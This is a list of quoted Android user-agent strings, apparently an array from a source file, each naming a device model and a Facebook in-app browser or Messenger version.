"Mozilla/5.0 (Linux; Android 7.0; LG-H990 Build/NRD90M; wv) AppleWebKit/537.36 (KHTML, like Gecko) Version/4.0 Chrome/66.0.3359.106 Mobile Safari/537.36 [FB_IAB/FB4A;FBAV/168.0.0.40.90;]",
"Mozilla/5.0 (Linux; Android 7.0; SM-A510F Build/NRD90M; wv) AppleWebKit/537.36 (KHTML, like Gecko) Version/4.0 Chrome/65.0.3325.109 Mobile Safari/537.36[FBAN/EMA;FBLC/ru_RU;FBAV/90.0.0.10.180;]",
"Mozilla/5.0 (Linux; Android 7.0; SM-G920F Build/NRD90M; wv) AppleWebKit/537.36 (KHTML, like Gecko) Version/4.0 Chrome/65.0.3325.109 Mobile Safari/537.36 [FB_IAB/FB4A;FBAV/167.0.0.42.94;]",
"Mozilla/5.0 (Linux; Android 6.0.1; ZUK Z1 Build/MOB31K; wv) AppleWebKit/537.36 (KHTML, like Gecko) Version/4.0 Chrome/51.0.2704.106 Mobile Safari/537.36[FBAN/EMA;FBLC/en_GB;FBAV/89.0.0.15.182;]",
"Mozilla/5.0 (Linux; Android 6.0.1; Moto G Play Build/MPIS24.241-15.3-26; wv) AppleWebKit/537.36 (KHTML, like Gecko) Version/4.0 Chrome/66.0.3359.106 Mobile Safari/537.36 [FB_IAB/FB4A;FBAV/167.0.0.42.94;]",
"Mozilla/5.0 (Linux; Android 5.0.2; LG-D410 Build/LRX22G.A1439780618; wv) AppleWebKit/537.36 (KHTML, like Gecko) Version/4.0 Chrome/65.0.3325.109 Mobile Safari/537.36[FBAN/EMA;FBLC/uk_UA;FBAV/89.0.0.16.182;]",
"Mozilla/5.0 (Linux; Android 6.0.1; D5803 Build/23.5.A.1.291; wv) AppleWebKit/537.36 (KHTML, like Gecko) Version/4.0 Chrome/65.0.3325.109 Mobile Safari/537.36 [FB_IAB/FB4A;FBAV/167.0.0.42.94;]",
"Mozilla/5.0 (Linux; Android 7.1.1; E6533 Build/32.4.A.1.54; wv) AppleWebKit/537.36 (KHTML, like Gecko) Version/4.0 Chrome/65.0.3325.109 Mobile Safari/537.36 [FB_IAB/FB4A;FBAV/167.0.0.42.94;]",
"Mozilla/5.0 (Linux; Android 6.0.1; D6603 Build/23.5.A.1.291; wv) AppleWebKit/537.36 (KHTML, like Gecko) Version/4.0 Chrome/65.0.3325.109 Mobile Safari/537.36 [FB_IAB/FB4A;FBAV/168.0.0.40.90;]",
"Mozilla/5.0 (Linux; Android 7.1.2; Redmi 4X Build/N2G47H; wv) AppleWebKit/537.36 (KHTML, like Gecko) Version/4.0 Chrome/61.0.3163.98 Mobile Safari/537.36 [FB_IAB/FB4A;FBAV/145.0.0.37.86;]",
"Mozilla/5.0 (Linux; Android 5.1; m3 note Build/LMY47I) AppleWebKit/537.36 (KHTML, like Gecko) Version/4.0 Chrome/40.0.2214.117 Mobile Safari/537.36[FBAN/EMA;FBLC/ru_RU;FBAV/90.0.0.10.180;]",
"Mozilla/5.0 (Linux; Android 5.1; HUAWEI LUA-U22 Build/HUAWEILUA-U22; wv) AppleWebKit/537.36 (KHTML, like Gecko) Version/4.0 Chrome/65.0.3325.109 Mobile Safari/537.36 [FB_IAB/FB4A;FBAV/167.0.0.42.94;]",
"Mozilla/5.0 (Linux; Android 6.0.1; Redmi Note 3 Build/MMB29M; wv) AppleWebKit/537.36 (KHTML, like Gecko) Version/4.0 Chrome/66.0.3359.106 Mobile Safari/537.36 [FB_IAB/FB4A;FBAV/168.0.0.40.90;]",
"Mozilla/5.0 (Linux; Android 7.0; SM-J701F Build/NRD90M; wv) AppleWebKit/537.36 (KHTML, like Gecko) Version/4.0 Chrome/62.0.3202.84 Mobile Safari/537.36 [FB_IAB/Orca-Android;FBAV/161.0.0.18.93;]",
"Mozilla/5.0 (Linux; Android 7.0; HUAWEI CAN-L11 Build/HUAWEICAN-L11; wv) AppleWebKit/537.36 (KHTML, like Gecko) Version/4.0 Chrome/65.0.3325.109 Mobile Safari/537.36 [FB_IAB/FB4A;FBAV/159.0.0.38.95;]",
"Mozilla/5.0 (Linux; Android 5.1.1; PSP5506DUO Build/LMY48B; wv) AppleWebKit/537.36 (KHTML, like Gecko) Version/4.0 Chrome/54.0.2840.85 Mobile Safari/537.36[FBAN/EMA;FBLC/uk_UA;FBAV/78.0.0.10.186;]",
"Mozilla/5.0 (Linux; Android 6.0; M5c Build/MRA58K; wv) AppleWebKit/537.36 (KHTML, like Gecko) Version/4.0 Chrome/44.0.2403.146 Mobile Safari/537.36 [FB_IAB/FB4A;FBAV/168.0.0.35.90;]",
"Mozilla/5.0 (Linux; Android 6.0; ALE-L21 Build/HuaweiALE-L21; wv) AppleWebKit/537.36 (KHTML, like Gecko) Version/4.0 Chrome/65.0.3325.109 Mobile Safari/537.36 [FB_IAB/FB4A;FBAV/167.0.0.42.94;]",
"Mozilla/5.0 (Linux; Android 7.1.2; Redmi 4X Build/N2G47H; wv) AppleWebKit/537.36 (KHTML, like Gecko) Version/4.0 Chrome/66.0.3359.106 Mobile Safari/537.36 [FB_IAB/FB4A;FBAV/167.0.0.42.94;]",
"Mozilla/5.0 (Linux; Android 7.0; Philips S386 Build/NRD90M; wv) AppleWebKit/537.36 (KHTML, like Gecko) Version/4.0 Chrome/59.0.3071.125 Mobile Safari/537.36 [FB_IAB/FB4A;FBAV/165.0.0.53.93;]",
"Mozilla/5.0 (Linux; Android 7.1.1; SM-A730F Build/NMF26X; wv) AppleWebKit/537.36 (KHTML, like Gecko) Version/4.0 Chrome/65.0.3325.109 Mobile Safari/537.36 [FB_IAB/FB4A;FBAV/168.0.0.40.90;]",
"Mozilla/5.0 (Linux; Android 7.0; SM-T815 Build/NRD90M; wv) AppleWebKit/537.36 (KHTML, like Gecko) Version/4.0 Chrome/65.0.3325.109 Safari/537.36 [FB_IAB/FB4A;FBAV/168.0.0.40.90;]",
"Mozilla/5.0 (Linux; Android 6.0; HUAWEI VNS-L21 Build/HUAWEIVNS-L21; wv) AppleWebKit/537.36 (KHTML, like Gecko) Version/4.0 Chrome/65.0.3325.109 Mobile Safari/537.36 [FB_IAB/Orca-Android;FBAV/162.0.0.19.90;]",
"Mozilla/5.0 (Linux; Android 7.0; SM-J530FM Build/NRD90M; wv) AppleWebKit/537.36 (KHTML, like Gecko) Version/4.0 Chrome/62.0.3202.84 Mobile Safari/537.36 [FB_IAB/FB4A;FBAV/168.0.0.40.90;]",
"Mozilla/5.0 (Linux; Android 7.0; SM-T819 Build/NRD90M; wv) AppleWebKit/537.36 (KHTML, like Gecko) Version/4.0 Chrome/65.0.3325.109 Safari/537.36 [FB_IAB/FB4A;FBAV/168.0.0.40.90;]",
"Mozilla/5.0 (Linux; Android 7.0; SM-G930F Build/NRD90M; wv) AppleWebKit/537.36 (KHTML, like Gecko) Version/4.0 Chrome/66.0.3359.106 Mobile Safari/537.36 [FB_IAB/Orca-Android;FBAV/161.0.0.18.93;]",
"Mozilla/5.0 (Linux; Android 7.1.2; Redmi 5 Plus Build/N2G47H; wv) AppleWebKit/537.36 (KHTML, like Gecko) Version/4.0 Chrome/66.0.3359.106 Mobile Safari/537.36 [FB_IAB/Orca-Android;FBAV/163.0.0.12.94;]",
"Mozilla/5.0 (Linux; Android 8.1.0; Nexus 5X Build/OPM2.171019.029; wv) AppleWebKit/537.36 (KHTML, like Gecko) Version/4.0 Chrome/66.0.3359.106 Mobile Safari/537.36 [FB_IAB/FB4A;FBAV/168.0.0.40.90;]",
"Mozilla/5.0 (Linux; Android 8.0.0; ONEPLUS A5010 Build/OPR1.170623.032; wv) AppleWebKit/537.36 (KHTML, like Gecko) Version/4.0 Chrome/63.0.3239.111 Mobile Safari/537.36[FBAN/EMA;FBLC/ru_RU;FBAV/84.0.0.16.184;]",
"Mozilla/5.0 (Linux; Android 6.0; Lenovo TB3-850F Build/MRA58K; wv) AppleWebKit/537.36 (KHTML, like Gecko) Version/4.0 Chrome/66.0.3359.106 Safari/537.36 [FB_IAB/FB4A;FBAV/167.0.0.42.94;]",
"Mozilla/5.0 (Linux; Android 7.0; SM-J710F Build/NRD90M; wv) AppleWebKit/537.36 (KHTML, like Gecko) Version/4.0 Chrome/65.0.3325.109 Mobile Safari/537.36 [FB_IAB/Orca-Android;FBAV/159.0.0.29.93;]",
"Mozilla/5.0 (Linux; Android 7.0; FRD-L09 Build/HUAWEIFRD-L09; wv) AppleWebKit/537.36 (KHTML, like Gecko) Version/4.0 Chrome/65.0.3325.109 Mobile Safari/537.36 [FB_IAB/FB4A;FBAV/168.0.0.40.90;]",
"Mozilla/5.0 (Linux; Android 6.0.1; Redmi 3S Build/MMB29M; wv) AppleWebKit/537.36 (KHTML, like Gecko) Version/4.0 Chrome/65.0.3325.109 Mobile Safari/537.36[FBAN/EMA;FBLC/ru_RU;FBAV/90.0.0.10.180;]",
"Mozilla/5.0 (Linux; U; Android 4.3; ru-ru; ASUS_T00J Build/JSS15Q) AppleWebKit/534.30 (KHTML, like Gecko) Version/4.0 Mobile Safari/534.30[FBAN/EMA;FBLC/ru_RU;FBAV/74.0.0.6.186;]",
"Mozilla/5.0 (Linux; Android 8.0.0; VKY-L29 Build/HUAWEIVKY-L29; wv) AppleWebKit/537.36 (KHTML, like Gecko) Version/4.0 Chrome/65.0.3325.109 Mobile Safari/537.36 [FB_IAB/FB4A;FBAV/167.0.0.42.94;]",
"Mozilla/5.0 (Linux; Android 8.0.0; Mi A1 Build/OPR1.170623.026; wv) AppleWebKit/537.36 (KHTML, like Gecko) Version/4.0 Chrome/66.0.3359.106 Mobile Safari/537.36 [FB_IAB/FB4A;FBAV/168.0.0.40.90;]",
"Mozilla/5.0 (Linux; Android 6.0; M5c Build/MRA58K; wv) AppleWebKit/537.36 (KHTML, like Gecko) Version/4.0 Chrome/44.0.2403.146 Mobile Safari/537.36[FBAN/EMA;FBLC/uk_UA;FBAV/48.0.0.3.68;]",
"Mozilla/5.0 (Linux; Android 5.1.1; SM-J120H Build/LMY47V; wv) AppleWebKit/537.36 (KHTML, like Gecko) Version/4.0 Chrome/65.0.3325.109 Mobile Safari/537.36 [FB_IAB/Orca-Android;FBAV/161.0.0.18.93;]",
"Mozilla/5.0 (Linux; Android 7.0; SM-J330F Build/NRD90M; wv) AppleWebKit/537.36 (KHTML, like Gecko) Version/4.0 Chrome/65.0.3325.109 Mobile Safari/537.36[FBAN/EMA;FBLC/uk_UA;FBAV/90.0.0.10.180;]",
"Mozilla/5.0 (Linux; Android 8.0.0; VTR-L29 Build/HUAWEIVTR-L29; wv) AppleWebKit/537.36 (KHTML, like Gecko) Version/4.0 Chrome/65.0.3325.109 Mobile Safari/537.36 [FB_IAB/FB4A;FBAV/167.0.0.42.94;]",
"Mozilla/5.0 (Linux; Android 8.0.0; ONEPLUS A3010 Build/OPR6.170623.013; wv) AppleWebKit/537.36 (KHTML, like Gecko) Version/4.0 Chrome/66.0.3359.106 Mobile Safari/537.36 [FB_IAB/FB4A;FBAV/168.0.0.40.90;]",
"Mozilla/5.0 (Linux; Android 5.1; HUAWEI TIT-U02 Build/HUAWEITIT-U02; wv) AppleWebKit/537.36 (KHTML, like Gecko) Version/4.0 Chrome/65.0.3325.109 Mobile Safari/537.36 [FB_IAB/Orca-Android;FBAV/162.0.0.19.90;]",
"Mozilla/5.0 (Linux; Android 7.0; BV6000 Build/NRD90M; wv) AppleWebKit/537.36 (KHTML, like Gecko) Version/4.0 Chrome/65.0.3325.109 Mobile Safari/537.36[FBAN/EMA;FBLC/ru_RU;FBAV/88.0.0.6.182;]",
"Mozilla/5.0 (Linux; Android 6.0; Redmi Note 4 Build/MRA58K; wv) AppleWebKit/537.36 (KHTML, like Gecko) Version/4.0 Chrome/65.0.3325.109 Mobile Safari/537.36 [FB_IAB/FB4A;FBAV/167.0.0.42.94;]",
"Mozilla/5.0 (Linux; Android 7.0; SM-N920C Build/NRD90M; wv) AppleWebKit/537.36 (KHTML, like Gecko) Version/4.0 Chrome/65.0.3325.109 Mobile Safari/537.36 [FB_IAB/FB4A;FBAV/168.0.0.40.90;]",
"Mozilla/5.0 (Linux; Android 8.0.0; SM-G960F Build/R16NW; wv) AppleWebKit/537.36 (KHTML, like Gecko) Version/4.0 Chrome/65.0.3325.109 Mobile Safari/537.36 [FB_IAB/FB4A;FBAV/168.0.0.40.90;]",
"Mozilla/5.0 (Linux; Android 5.1; FREEDOM X1 Build/LMY47D) AppleWebKit/537.36 (KHTML, like Gecko) Version/4.0 Chrome/39.0.0.0 Mobile Safari/537.36 [FB_IAB/FB4A;FBAV/168.0.0.40.90;]",
"Mozilla/5.0 (Linux; Android 5.0.2; Lenovo S90-A Build/LRX22G; wv) AppleWebKit/537.36 (KHTML, like Gecko) Version/4.0 Chrome/61.0.3163.98 Mobile Safari/537.36 [FB_IAB/FB4A;FBAV/146.0.0.53.92;]",
"Mozilla/5.0 (Linux; Android 7.0; PRA-LA1 Build/HUAWEIPRA-LA1; wv) AppleWebKit/537.36 (KHTML, like Gecko) Version/4.0 Chrome/65.0.3325.109 Mobile Safari/537.36 [FB_IAB/FB4A;FBAV/168.0.0.40.90;]",
"Mozilla/5.0 (Linux; Android 7.0; SM-A320F Build/NRD90M; wv) AppleWebKit/537.36 (KHTML, like Gecko) Version/4.0 Chrome/64.0.3282.137 Mobile Safari/537.36 [FB_IAB/FB4A;FBAV/167.0.0.42.94;]",
"Mozilla/5.0 (Linux; Android 5.0.2; LG-V490 Build/LRX22G; wv) AppleWebKit/537.36 (KHTML, like Gecko) Version/4.0 Chrome/66.0.3359.106 Safari/537.36[FBAN/EMA;FBLC/ru_RU;FBAV/90.0.0.10.180;]",
"Mozilla/5.0 (Linux; Android 7.0; SM-T713 Build/NRD90M; wv) AppleWebKit/537.36 (KHTML, like Gecko) Version/4.0 Chrome/65.0.3325.109 Safari/537.36 [FB_IAB/FB4A;FBAV/168.0.0.40.90;]",
"Mozilla/5.0 (Linux; Android 7.0; ZUK Z2131 Build/NRD90M; wv) AppleWebKit/537.36 (KHTML, like Gecko) Version/4.0 Chrome/65.0.3325.109 Mobile Safari/537.36 [FB_IAB/FB4A;FBAV/164.0.0.44.95;]",
"Mozilla/5.0 (Linux; Android 7.0; XT1580 Build/NPKS25.200-12-9; wv) AppleWebKit/537.36 (KHTML, like Gecko) Version/4.0 Chrome/66.0.3359.106 Mobile Safari/537.36 [FB_IAB/FB4A;FBAV/167.0.0.42.94;]",
"Mozilla/5.0 (Linux; Android 6.0; M5 Note Build/MRA58K; wv) AppleWebKit/537.36 (KHTML, like Gecko) Version/4.0 Chrome/44.0.2403.128 Mobile Safari/537.36[FBAN/EMA;FBLC/uk_UA;FBAV/89.0.0.16.182;]",
"Mozilla/5.0 (Linux; Android 7.1.1; SM-J510H Build/NMF26X; wv) AppleWebKit/537.36 (KHTML, like Gecko) Version/4.0 Chrome/62.0.3202.84 Mobile Safari/537.36 [FB_IAB/FB4A;FBAV/167.0.0.42.94;]",
"Mozilla/5.0 (Linux; Android 5.1; HUAWEI TIT-U02 Build/HUAWEITIT-U02; wv) AppleWebKit/537.36 (KHTML, like Gecko) Version/4.0 Chrome/65.0.3325.109 Mobile Safari/537.36 [FB_IAB/FB4A;FBAV/167.0.0.42.94;]",
"Mozilla/5.0 (Linux; Android 7.0; EVA-L19 Build/HUAWEIEVA-L19; wv) AppleWebKit/537.36 (KHTML, like Gecko) Version/4.0 Chrome/65.0.3325.109 Mobile Safari/537.36 [FB_IAB/FB4A;FBAV/167.0.0.42.94;]",
"Mozilla/5.0 (Linux; Android 7.0; SM-G935F Build/NRD90M; wv) AppleWebKit/537.36 (KHTML, like Gecko) Version/4.0 Chrome/66.0.3359.106 Mobile Safari/537.36 [FB_IAB/FB4A;FBAV/168.0.0.40.90;]",
"Mozilla/5.0 (Linux; Android 7.0; Redmi Note 4 Build/NRD90M; wv) AppleWebKit/537.36 (KHTML, like Gecko) Version/4.0 Chrome/65.0.3325.109 Mobile Safari/537.36 [FB_IAB/FB4A;FBAV/167.0.0.42.94;]",
"Mozilla/5.0 (Linux; Android 6.0.1; SM-G610F Build/MMB29K; wv) AppleWebKit/537.36 (KHTML, like Gecko) Version/4.0 Chrome/65.0.3325.109 Mobile Safari/537.36 [FB_IAB/FB4A;FBAV/167.0.0.42.94;]",
"Mozilla/5.0 (Linux; Android 7.0; Moto G (5) Plus Build/NPNS25.137-93-8; wv) AppleWebKit/537.36 (KHTML, like Gecko) Version/4.0 Chrome/66.0.3359.106 Mobile Safari/537.36 [FB_IAB/FB4A;FBAV/167.0.0.42.94;]",
"Mozilla/5.0 (Linux; Android 5.1; Lenovo P1ma40 Build/LMY47D; wv) AppleWebKit/537.36 (KHTML, like Gecko) Version/4.0 Chrome/66.0.3359.106 Mobile Safari/537.36 [FB_IAB/FB4A;FBAV/167.0.0.42.94;]",
"Mozilla/5.0 (Linux; Android 6.0.1; SM-G900F Build/MMB29M; wv) AppleWebKit/537.36 (KHTML, like Gecko) Version/4.0 Chrome/65.0.3325.109 Mobile Safari/537.36 [FB_IAB/FB4A;FBAV/167.0.0.42.94;]",
"Mozilla/5.0 (Linux; Android 8.0.0; F5122 Build/34.4.A.2.32; wv) AppleWebKit/537.36 (KHTML, like Gecko) Version/4.0 Chrome/65.0.3325.109 Mobile Safari/537.36[FBAN/EMA;FBLC/ru_RU;FBAV/90.0.0.10.180;]",
"Mozilla/5.0 (Linux; Android 6.0.1; SM-G900H Build/MMB29K; wv) AppleWebKit/537.36 (KHTML, like Gecko) Version/4.0 Chrome/65.0.3325.109 Mobile Safari/537.36 [FB_IAB/FB4A;FBAV/167.0.0.42.94;]",
"Mozilla/5.0 (Linux; Android 7.0; SM-A520F Build/NRD90M; wv) AppleWebKit/537.36 (KHTML, like Gecko) Version/4.0 Chrome/64.0.3282.137 Mobile Safari/537.36 [FB_IAB/Orca-Android;FBAV/160.0.0.28.92;]",
"Mozilla/5.0 (Linux; Android 7.1.2; Redmi 4A Build/N2G47H; wv) AppleWebKit/537.36 (KHTML, like Gecko) Version/4.0 Chrome/65.0.3325.109 Mobile Safari/537.36 [FB_IAB/FB4A;FBAV/167.0.0.42.94;]",
"Mozilla/5.0 (Linux; Android 5.1; m3 note Build/LMY47I; wv) AppleWebKit/537.36 (KHTML, like Gecko) Version/4.0 Chrome/44.0.2403.146 Mobile Safari/537.36 [FB_IAB/FB4A;FBAV/166.0.0.63.95;]",
"Mozilla/5.0 (Linux; Android 7.0; FRD-L09 Build/HUAWEIFRD-L09; wv) AppleWebKit/537.36 (KHTML, like Gecko) Version/4.0 Chrome/66.0.3359.106 Mobile Safari/537.36 [FB_IAB/FB4A;FBAV/168.0.0.40.90;]",
"Mozilla/5.0 (Linux; Android 7.1.2; Redmi 4X Build/N2G47H; wv) AppleWebKit/537.36 (KHTML, like Gecko) Version/4.0 Chrome/65.0.3325.109 Mobile Safari/537.36 [FB_IAB/Orca-Android;FBAV/161.0.0.18.93;]",
"Mozilla/5.0 (Linux; Android 6.0; M5c Build/MRA58K; wv) AppleWebKit/537.36 (KHTML, like Gecko) Version/4.0 Chrome/44.0.2403.146 Mobile Safari/537.36 [FB_IAB/FB4A;FBAV/167.0.0.42.94;]",
"Mozilla/5.0 (Linux; Android 5.0.1; ALE-L21 Build/HuaweiALE-L21) AppleWebKit/537.36 (KHTML, like Gecko) Version/4.0 Chrome/37.0.0.0 Mobile Safari/537.36 [FB_IAB/FB4A;FBAV/168.0.0.40.90;]",
"Mozilla/5.0 (Linux; Android 6.0; CUBOT_NOTE_S Build/MRA58K; wv) AppleWebKit/537.36 (KHTML, like Gecko) Version/4.0 Chrome/65.0.3325.109 Mobile Safari/537.36 [FB_IAB/FB4A;FBAV/167.0.0.42.94;]",
"Mozilla/5.0 (Linux; Android 6.0; CAM-L21 Build/HUAWEICAM-L21; wv) AppleWebKit/537.36 (KHTML, like Gecko) Version/4.0 Chrome/65.0.3325.109 Mobile Safari/537.36 [FB_IAB/FB4A;FBAV/167.0.0.42.94;]",
"Mozilla/5.0 (Linux; Android 7.0; SM-J710F Build/NRD90M; wv) AppleWebKit/537.36 (KHTML, like Gecko) Version/4.0 Chrome/65.0.3325.109 Mobile Safari/537.36 [FB_IAB/FB4A;FBAV/168.0.0.40.90;]",
"Mozilla/5.0 (Linux; Android 6.0.1; SM-J500H Build/MMB29M; wv) AppleWebKit/537.36 (KHTML, like Gecko) Version/4.0 Chrome/65.0.3325.109 Mobile Safari/537.36 [FB_IAB/FB4A;FBAV/167.0.0.42.94;]",
"Mozilla/5.0 (Linux; Android 6.0.1; Redmi 4 Build/MMB29M; wv) AppleWebKit/537.36 (KHTML, like Gecko) Version/4.0 Chrome/63.0.3239.111 Mobile Safari/537.36 [FB_IAB/FB4A;FBAV/153.0.0.54.88;]",
"Mozilla/5.0 (Linux; Android 8.0.0; ONEPLUS A5000 Build/OPR1.170623.032; wv) AppleWebKit/537.36 (KHTML, like Gecko) Version/4.0 Chrome/65.0.3325.109 Mobile Safari/537.36 [FB_IAB/FB4A;FBAV/167.0.0.42.94;]",
"Mozilla/5.0 (Linux; Android 6.0.1; SM-J700H Build/MMB29K; wv) AppleWebKit/537.36 (KHTML, like Gecko) Version/4.0 Chrome/65.0.3325.109 Mobile Safari/537.36[FBAN/EMA;FBLC/ru_RU;FBAV/89.0.0.16.182;]",
"Mozilla/5.0 (Linux; U; Android 4.1.1; fr-fr; HTC One X+ Build/JRO03C) AppleWebKit/534.30 (KHTML, like Gecko) Version/4.0 Mobile Safari/534.30[FBAN/EMA;FBLC/fr_FR;FBAV/54.0.0.2.86;]",
"Mozilla/5.0 (Linux; Android 7.0; SM-J710F Build/NRD90M; wv) AppleWebKit/537.36 (KHTML, like Gecko) Version/4.0 Chrome/66.0.3359.106 Mobile Safari/537.36 [FB_IAB/FB4A;FBAV/169.0.0.22.94;]",
"Mozilla/5.0 (Linux; Android 7.1.2; Mi A1 Build/N2G47H; wv) AppleWebKit/537.36 (KHTML, like Gecko) Version/4.0 Chrome/65.0.3325.109 Mobile Safari/537.36 [FB_IAB/FB4A;FBAV/167.0.0.42.94;]",
"Mozilla/5.0 (Linux; Android 5.1.1; Redmi 3 Build/LMY47V; wv) AppleWebKit/537.36 (KHTML, like Gecko) Version/4.0 Chrome/65.0.3325.109 Mobile Safari/537.36 [FB_IAB/FB4A;FBAV/167.0.0.42.94;]",
"Mozilla/5.0 (Linux; Android 5.1; HT3 Pro Build/LMY47D; wv) AppleWebKit/537.36 (KHTML, like Gecko) Version/4.0 Chrome/65.0.3325.109 Mobile Safari/537.36[FBAN/EMA;FBLC/ru_RU;FBAV/88.0.0.6.182;]",
"Mozilla/5.0 (Linux; Android 7.1.1; Power_3 Build/N6F26Q; wv) AppleWebKit/537.36 (KHTML, like Gecko) Version/4.0 Chrome/65.0.3325.109 Mobile Safari/537.36 [FB_IAB/FB4A;FBAV/167.0.0.42.94;]",
"Mozilla/5.0 (Linux; Android 7.0; LG-H870 Build/NRD90U; wv) AppleWebKit/537.36 (KHTML, like Gecko) Version/4.0 Chrome/65.0.3325.109 Mobile Safari/537.36 [FB_IAB/FB4A;FBAV/167.0.0.42.94;]",
"Mozilla/5.0 (Linux; Android 7.0; HUAWEI CAN-L11 Build/HUAWEICAN-L11; wv) AppleWebKit/537.36 (KHTML, like Gecko) Version/4.0 Chrome/65.0.3325.109 Mobile Safari/537.36 [FB_IAB/FB4A;FBAV/167.0.0.42.94;]",
"Mozilla/5.0 (Linux; Android 6.0.1; Lenovo Z90a40 Build/MMB29M; wv) AppleWebKit/537.36 (KHTML, like Gecko) Version/4.0 Chrome/66.0.3359.106 Mobile Safari/537.36 [FB_IAB/Orca-Android;FBAV/161.0.0.18.93;]",
"Mozilla/5.0 (Linux; Android 7.0; SLA-L22 Build/HUAWEISLA-L22; wv) AppleWebKit/537.36 (KHTML, like Gecko) Version/4.0 Chrome/65.0.3325.109 Mobile Safari/537.36 [FB_IAB/Orca-Android;FBAV/161.0.0.18.93;]",
"Mozilla/5.0 (Linux; Android 5.1.1; ZTE T617 Build/LMY47V; wv) AppleWebKit/537.36 (KHTML, like Gecko) Version/4.0 Chrome/65.0.3325.109 Mobile Safari/537.36 [FB_IAB/FB4A;FBAV/167.0.0.42.94;]",
"Mozilla/5.0 (Linux; Android 7.0; TRT-LX1 Build/HUAWEITRT-LX1; wv) AppleWebKit/537.36 (KHTML, like Gecko) Version/4.0 Chrome/65.0.3325.109 Mobile Safari/537.36 [FB_IAB/FB4A;FBAV/168.0.0.40.90;]",
"Mozilla/5.0 (Linux; Android 6.0; HT20Pro Build/MRA58K; wv) AppleWebKit/537.36 (KHTML, like Gecko) Version/4.0 Chrome/65.0.3325.109 Mobile Safari/537.36 [FB_IAB/FB4A;FBAV/167.0.0.42.94;]",
"Mozilla/5.0 (Linux; Android 6.0.1; Redmi Note 3 Build/MMB29M; wv) AppleWebKit/537.36 (KHTML, like Gecko) Version/4.0 Chrome/65.0.3325.109 Mobile Safari/537.36 [FB_IAB/FB4A;FBAV/167.0.0.42.94;]",
"Mozilla/5.0 (Linux; Android 8.0.0; ONEPLUS A3003 Build/OPR6.170623.013; wv) AppleWebKit/537.36 (KHTML, like Gecko) Version/4.0 Chrome/65.0.3325.109 Mobile Safari/537.36 [FB_IAB/FB4A;FBAV/167.0.0.42.94;]",
"Mozilla/5.0 (Linux; U; Android 4.3; ru-ru; GT-I9300 Build/JSS15J) AppleWebKit/534.30 (KHTML, like Gecko) Version/4.0 Mobile Safari/534.30[FBAN/EMA;FBLC/ru_RU;FBAV/90.0.0.10.180;]",
"Mozilla/5.0 (Linux; Android 6.0; BV6000 Build/MRA58K; wv) AppleWebKit/537.36 (KHTML, like Gecko) Version/4.0 Chrome/44.0.2403.119 Mobile Safari/537.36 [FB_IAB/FB4A;FBAV/159.0.0.38.95;]",
"Mozilla/5.0 (Linux; Android 7.0; BAH-L09 Build/HUAWEIBAH-L09; wv) AppleWebKit/537.36 (KHTML, like Gecko) Version/4.0 Chrome/65.0.3325.109 Safari/537.36 [FB_IAB/FB4A;FBAV/168.0.0.40.90;]",
"Mozilla/5.0 (Linux; Android 5.1.1; SM-J120H Build/LMY47V; wv) AppleWebKit/537.36 (KHTML, like Gecko) Version/4.0 Chrome/58.0.3029.83 Mobile Safari/537.36 [FB_IAB/FB4A;FBAV/159.0.0.38.95;]",
"Mozilla/5.0 (Linux; Android 5.1.1; SM-J200H Build/LMY48B; wv) AppleWebKit/537.36 (KHTML, like Gecko) Version/4.0 Chrome/65.0.3325.109 Mobile Safari/537.36 [FB_IAB/FB4A;FBAV/168.0.0.40.90;]",
"Mozilla/5.0 (Linux; Android 7.0; FRD-L09 Build/HUAWEIFRD-L09; wv) AppleWebKit/537.36 (KHTML, like Gecko) Version/4.0 Chrome/65.0.3325.109 Mobile Safari/537.36 [FB_IAB/FB4A;FBAV/168.0.0.35.90;]",
"Mozilla/5.0 (Linux; Android 5.1; HUAWEI TIT-U02 Build/HUAWEITIT-U02) AppleWebKit/537.36 (KHTML, like Gecko) Version/4.0 Chrome/39.0.0.0 Mobile Safari/537.36 [FB_IAB/FB4A;FBAV/167.0.0.42.94;]",
"Mozilla/5.0 (Linux; Android 5.0.2; SM-G530H Build/LRX22G; wv) AppleWebKit/537.36 (KHTML, like Gecko) Version/4.0 Chrome/58.0.3029.83 Mobile Safari/537.36 [FB_IAB/FB4A;FBAV/165.0.0.53.93;]",
"Mozilla/5.0 (Linux; Android 7.0; SM-G930F Build/NRD90M; wv) AppleWebKit/537.36 (KHTML, like Gecko) Version/4.0 Chrome/65.0.3325.109 Mobile Safari/537.36 [FB_IAB/FB4A;FBAV/167.0.0.42.94;]",
"Mozilla/5.0 (Linux; Android 6.0.1; SM-G900H Build/MMB29K; wv) AppleWebKit/537.36 (KHTML, like Gecko) Version/4.0 Chrome/66.0.3359.106 Mobile Safari/537.36 [FB_IAB/FB4A;FBAV/168.0.0.40.90;]",
"Mozilla/5.0 (Linux; Android 8.0.0; SM-G950F Build/R16NW; wv) AppleWebKit/537.36 (KHTML, like Gecko) Version/4.0 Chrome/65.0.3325.109 Mobile Safari/537.36 [FB_IAB/Orca-Android;FBAV/161.0.0.18.93;]",
"Mozilla/5.0 (Linux; Android 5.0.2; Lenovo A5000 Build/LRX22G; wv) AppleWebKit/537.36 (KHTML, like Gecko) Version/4.0 Chrome/65.0.3325.109 Mobile Safari/537.36 [FB_IAB/FB4A;FBAV/163.0.0.43.91;]",
"Mozilla/5.0 (Linux; Android 7.0; SM-A310F Build/NRD90M; wv) AppleWebKit/537.36 (KHTML, like Gecko) Version/4.0 Chrome/65.0.3325.109 Mobile Safari/537.36 [FB_IAB/FB4A;FBAV/168.0.0.40.90;]",
"Mozilla/5.0 (Linux; Android 6.0; LG-K430 Build/MRA58K; wv) AppleWebKit/537.36 (KHTML, like Gecko) Version/4.0 Chrome/65.0.3325.109 Mobile Safari/537.36 [FB_IAB/FB4A;FBAV/168.0.0.40.90;]",
"Mozilla/5.0 (Linux; Android 7.0; 6060X Build/NRD90M; wv) AppleWebKit/537.36 (KHTML, like Gecko) Version/4.0 Chrome/65.0.3325.109 Mobile Safari/537.36 [FB_IAB/FB4A;FBAV/167.0.0.42.94;]",
"Mozilla/5.0 (Linux; Android 5.0.2; SM-P905 Build/LRX22G; wv) AppleWebKit/537.36 (KHTML, like Gecko) Version/4.0 Chrome/65.0.3325.109 Safari/537.36 [FB_IAB/FB4A;FBAV/167.0.0.42.94;]",
"Mozilla/5.0 (Linux; Android 7.0; itel A31 Build/NRD90M; wv) AppleWebKit/537.36 (KHTML, like Gecko) Version/4.0 Chrome/58.0.3029.83 Mobile Safari/537.36 [FB_IAB/FB4A;FBAV/164.0.0.44.95;]",
